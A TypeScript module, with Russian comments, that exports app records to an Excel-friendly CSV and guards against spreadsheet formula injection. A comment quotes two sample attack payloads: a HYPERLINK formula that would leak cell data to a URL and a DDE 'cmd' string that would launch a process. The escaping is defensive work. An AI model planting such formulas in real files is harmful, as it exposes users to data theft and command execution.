// Выгрузка раздела в CSV: «свои данные можно забрать» — то же, что мы умеем принимать.
// Excel в России ждёт «;» и UTF-8 с BOM, иначе кириллица превращается в кракозябры.
import type { EntityCfg, Field, Rec } from "./model";
import { displayValue } from "./model";
import { fmtRuDate, fmtRuTime } from "./rudate";

// Excel считает формулой всё, что начинается с = + - @ (и с табуляции/возврата каретки).
// Имя клиента приходит с формы сайта и из Telegram — то есть текст в ячейке пишет чужой человек:
// `=HYPERLINK("http://…"&A2&B2)` утащил бы всю базу, `=cmd|'/C calc'!A0` запустил бы процесс.
// Поэтому опасное начало гасим апострофом. Телефоны (`+7 916 …`) — не формула, их не трогаем.
const PHONEISH = /^\+?[\d\s()\-.]{4,}$/;          // +7 916 111-22-33
const NUMERIC = /^[+-]?\d+([.,]\d+)?$/;           // -5, +3,5 — это число, а не формула
const risky = (v: string) => /^[=@\t\r]/.test(v) || (/^[+\-]/.test(v) && !PHONEISH.test(v) && !NUMERIC.test(v));
const quote = (v: string) => `"${v.replace(/"/g, '""')}"`;
const cell = (v: string) => {
  const safe = risky(v) ? "'" + v : v;
  return /[";\n\r]/.test(safe) ? quote(safe) : safe;
};

// В файле дата обязана быть полной. Экранная «24 авг.» без года превращала выгрузку
// в одностороннюю дорогу: загрузив свой же файл обратно, человек терял год у всех дней рождения.
function outValue(f: Field, v: unknown, ctx: { recTitle: (id: string) => string; userName: (id: string) => string }): string {
  if (v === undefined || v === null || v === "") return "";
  if (f.type === "date") return fmtRuDate(v);
  if (f.type === "datetime") return fmtRuDate(v) + " " + fmtRuTime(v);
  // деньги и числа — без ₽ и пробелов, чтобы Excel посчитал их числами, а мы прочли обратно
  if (f.type === "money" || f.type === "number") {
    const n = Number(v);
    return isNaN(n) ? "" : String(n).replace(".", ",");
  }
  return displayValue(f, v, ctx);
}

export function toCSV(e: EntityCfg, recs: Rec[], ctx: { recTitle: (id: string) => string; userName: (id: string) => string }): string {
  const cols = e.fields;
  const head = ["№", ...cols.map(f => f.label), ...(e.stages?.length ? ["Стадия"] : []), "Ответственный", "Создано"];
  const rows = recs.map(r => [
    String(r.num),
    ...cols.map(f => outValue(f, r.values[f.id], ctx)),
    ...(e.stages?.length ? [e.stages.find(s => s.id === r.stageId)?.label ?? ""] : []),
    ctx.userName(r.ownerId) || "",
    new Date(r.createdAt).toLocaleDateString("ru-RU"),
  ]);
  return [head, ...rows].map(r => r.map(x => cell(String(x ?? ""))).join(";")).join("\r\n");
}

export function downloadCSV(name: string, csv: string): void {
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  const d = new Date();
  const stamp = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
  a.download = `${name.replace(/[^\wа-яА-ЯёЁ]+/g, "_")}_${stamp}.csv`;   // без пробелов и тире: Chromium иначе теряет имя
  document.body.appendChild(a); a.click();
  // якорь убираем не сразу: если снести его в тот же тик, Chromium теряет имя файла
  setTimeout(() => { a.remove(); URL.revokeObjectURL(url); }, 1000);
}
